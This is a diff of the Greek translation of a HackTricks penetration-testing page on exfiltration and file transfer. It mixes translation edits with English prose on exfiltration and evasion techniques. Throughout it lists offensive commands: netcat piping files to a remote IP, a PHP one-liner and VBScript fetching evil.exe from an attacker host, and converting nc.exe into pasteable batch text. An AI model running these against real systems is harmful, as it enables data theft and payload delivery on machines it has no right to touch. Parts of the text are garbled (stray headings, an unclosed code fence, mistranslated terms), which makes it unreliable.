@@ -1,39 +1,40 @@
-# Εξιχνίαση
+# Εξυφαίρεση
+
+{% hint style="success" %}
+Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Εκπαίδευση HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Εκπαίδευση HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Ειδικός Red Team του HackTricks στο AWS)</strong></a><strong>!</strong></summary>
+<summary>Υποστηρίξτε το HackTricks</summary>
 
-Άλλοι τρόποι υποστήριξης του HackTricks:
-
-* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
-* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.
+* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
+* **Εγγραφείτε** 💬 [**στην ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Κοινοποιήστε κόλπα χάκερ υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.
 
 </details>
+{% endhint %}
 
 **Try Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
 ***
 
-## Συνήθως εγκριμένοι τομείς για την εξιχνίαση πληροφοριών
+## Συνήθως εγκριμένοι τομείς για εξύφανση πληροφοριών
 
 Ελέγξτε το [https://lots-project.com/](https://lots-project.com/) για να βρείτε συνήθως εγκριμένους τομείς που μπορούν να καταχραστούν
 
-## Αντιγραφή & Επικόλληση Base64
+## Αντιγραφή\&Επικόλληση Base64
 
 **Linux**
 ```bash
 base64 -w0 <file> #Encode file
 base64 -d file #Decode file
 ```
-**Windows**
+**Παράθυρα**
 ```
 certutil -encode payload.dll payload.b64
 certutil -decode payload.b64 payload.dll
@@ -65,8 +66,8 @@ Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ### Μεταφόρτωση αρχείων
 
 * [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
-* [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
-* Python module [uploadserver](https://pypi.org/project/uploadserver/):
+* [**SimpleHttpServer εκτύπωση GET και POSTs (επίσης headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
+* Πρόσθετο Python [uploadserver](https://pypi.org/project/uploadserver/):
 ```bash
 # Listen to files
 python3 -m pip install --user uploadserver
@@ -122,7 +123,7 @@ app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 ```
 ## FTP
 
-### Διακομιστής FTP (python)
+### FTP εξυπηρετητής (python)
 ```bash
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21
@@ -185,41 +186,37 @@ guest ok = Yes
 #Start samba
 service smbd restart
 ```
-### Exfiltration
+Windows
 
-#### Techniques
+---
 
-- **Data Compression**: Compress data before exfiltration to reduce size and avoid detection.
-- **Data Encryption**: Encrypt data before exfiltration to protect it from unauthorized access.
-- **Data Fragmentation**: Break data into smaller fragments for exfiltration to evade detection.
-- **Data Hiding**: Hide exfiltrated data within other files or protocols to avoid detection.
-- **Steganography**: Conceal data within images, audio files, or other media to exfiltrate without detection.
-- **Traffic Manipulation**: Manipulate network traffic to disguise exfiltration as normal traffic.
-- **DNS Tunneling**: Use DNS protocol to exfiltrate data by encoding it within DNS queries and responses.
-- **Exfiltration Over Alternative Protocols**: Use non-standard protocols for exfiltration to bypass detection mechanisms.
-- **Exfiltration Over Encrypted Channels**: Use encrypted channels for exfiltration to avoid detection by network monitoring tools.
+### Exfiltration Techniques
 
-#### Tools
+#### Data Compression
 
-- **Netcat**: A versatile networking utility that can be used for exfiltration.
-- **Curl**: A command-line tool for transferring data with URL syntax that can be used for exfiltration.
-- **Wget**: A command-line utility for downloading files from the web that can be used for exfiltration.
-- **FTP**: File Transfer Protocol can be used for exfiltration of data.
-- **SCP**: Secure Copy Protocol can securely transfer files for exfiltration.
-- **SFTP**: Secure File Transfer Protocol can be used for secure exfiltration of files.
-- **HTTP/HTTPS**: Hypertext Transfer Protocol can be used for exfiltration over the web.
-- **DNSCat2**: A tool for exfiltration using DNS protocol.
-- **Iodine**: A tool for tunneling IP over DNS for exfiltration.
-- **Dnscat2**: Another tool for exfiltration using DNS protocol.
-- **PowerShell Empire**: A post-exploitation agent that can be used for exfiltration.
-- **Mimikatz**: A tool for extracting credentials from Windows machines that can aid in exfiltration.
-- **PsExec**: A command-line tool that can be used for executing processes on remote systems for exfiltration.
-- **Bitsadmin**: A command-line tool to create and monitor BITS jobs for exfiltration.
-- **Certutil**: A command-line program that can be used to dump and display certification authority (CA) configuration information.
-- **WMIC**: Windows Management Instrumentation Command-line can be used for exfiltration.
-- **PowerShell**: The Windows PowerShell can be used for various exfiltration techniques.
-- **Windows Management Instrumentation (WMI)**: WMI can be used for exfiltration of data from Windows systems.
-- **Windows Remote Management (WinRM)**: WinRM can be used for remote management and exfiltration on Windows systems.
+Data compression is a common technique used to reduce the size of exfiltrated data. This can be achieved using various algorithms such as gzip, bzip2, or custom compression methods.
+
+#### Data Encryption
+
+Encrypting exfiltrated data ensures that even if the data is intercepted, it remains secure and cannot be easily accessed by unauthorized parties. Strong encryption algorithms such as AES are commonly used for this purpose.
+
+#### Data Fragmentation
+
+Breaking down exfiltrated data into smaller fragments can help avoid detection and make it harder for security controls to identify and block the exfiltration. The fragmented data can later be reassembled by the attacker.
+
+#### Data Obfuscation
+
+Obfuscating exfiltrated data involves disguising the data to make it unintelligible to anyone other than the intended recipient. This can be achieved through techniques such as base64 encoding, XOR encryption, or using steganography to hide data within other files or images.
+
+#### Data Hiding
+
+Hiding exfiltrated data within seemingly innocuous files or locations can help evade detection. Attackers may hide data within image files, text documents, or even unused sectors on a disk to avoid raising suspicion.
+
+#### Covert Channels
+
+Covert channels are communication channels that are hidden within legitimate network traffic or protocols. Attackers can use covert channels to exfiltrate data without triggering security alerts, as the communication appears to be normal traffic.
+
+By combining these exfiltration techniques, attackers can effectively exfiltrate data from a target network without being detected.
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -241,7 +238,7 @@ sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
 sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
 ```
-## Εξωτερική μεταφορά (Exfiltration)
+## Εξωτερική μεταφορά
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
@@ -282,7 +279,7 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-Εάν μπορείτε να στείλετε δεδομένα σε έναν διακομιστή SMTP, μπορείτε να δημιουργήσετε έναν SMTP για να λάβετε τα δεδομένα με τη χρήση της Python:
+Αν μπορείτε να στείλετε δεδομένα σε έναν διακομιστή SMTP, μπορείτε να δημιουργήσετε έναν SMTP για να λάβετε τα δεδομένα με τη χρήση της Python:
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
@@ -308,33 +305,11 @@ tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-Λήψη ενός αρχείου με ένα PHP oneliner:
+Κατεβάστε ένα αρχείο με ένα PHP oneliner:
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
 ## VBScript
-
-### Overview
-
-VBScript is a scripting language that is commonly used for Windows systems. It can be used for various purposes, including exfiltrating data from a compromised system. VBScript can be executed using the Windows Script Host (WSH) and can interact with the Windows operating system to perform tasks such as file operations, network communication, and data exfiltration.
-
-### Exfiltration Techniques
-
-#### File Transfer
-
-VBScript can be used to transfer files from a compromised system to an external server using protocols such as FTP or HTTP. By reading the contents of a file and sending it over the network, an attacker can exfiltrate sensitive data without being detected.
-
-#### Data Encoding
-
-To avoid detection by security controls, data exfiltrated using VBScript can be encoded using techniques such as Base64 encoding. This allows the data to be obfuscated during transit and decoded on the attacker's server.
-
-#### Network Communication
-
-VBScript can establish network connections to send data to remote servers controlled by an attacker. By leveraging network sockets, VBScript can communicate over TCP or UDP to exfiltrate data stealthily.
-
-### Detection and Prevention
-
-Detecting VBScript-based exfiltration can be challenging due to its ability to blend in with legitimate scripting activities. Monitoring for suspicious network connections, file transfers, and unusual data encoding patterns can help in detecting potential exfiltration attempts. Restricting the use of VBScript and implementing application whitelisting can help prevent unauthorized scripts from running on Windows systems.
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
@@ -378,6 +353,33 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
+```markdown
+Στη συνέχεια αντιγράψτε και επικολλήστε το κείμενο στο παράθυρο κελύφους των Windows και θα δημιουργηθεί ένα αρχείο με το όνομα nc.exe.
+
+* [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
+
 ## DNS
 
 * [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)
+
+**Try Hard Security Group**
+
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://discord.gg/tryhardsecurity" %}
+
+{% hint style="success" %}
+Μάθετε & εξασκηθείτε στο Hacking του AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Μάθετε & εξασκηθείτε στο Hacking του GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
+<details>
+
+<summary>Υποστηρίξτε το HackTricks</summary>
+
+* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
+* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs** στα αποθετήρια [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
+
+</details>
+{% endhint %}
+```
